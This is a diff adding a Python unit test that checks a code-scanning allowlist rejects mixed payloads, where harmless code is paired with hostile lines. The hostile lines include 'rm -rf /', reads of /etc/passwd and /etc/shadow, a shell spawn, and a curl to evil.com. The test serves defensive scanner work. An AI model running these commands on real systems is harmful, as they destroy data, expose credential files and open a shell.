@@ -81,5 +81,20 @@ class TestIronDome(unittest.TestCase):
                 self.assertEqual(result["status"], "ALLOW")
                 self.assertIn("GREEN DOME", result["analysis"])
 
+    def test_green_dome_rejects_composite_and_embedded_malicious_payloads(self):
+        # Green Dome must strictly require the ENTIRE payload to match an allowed pattern.
+        # It must NEVER allow composite payloads containing benign substrings.
+        composite_payloads = [
+            "import json\nos.system('rm -rf /')",
+            "print('hello')\nos.system('cat /etc/passwd')",
+            "x = 42\nopen('/etc/shadow').read()",
+            "import math\n__import__('os').system('sh')",
+            "5 + 5\ncurl http://evil.com"
+        ]
+        for payload in composite_payloads:
+            with self.subTest(payload=payload):
+                result = IronDome.scan_allowlist(payload)
+                self.assertIsNone(result, f"Green Dome improperly approved composite payload: {payload}")
+
 if __name__ == '__main__':
     unittest.main()
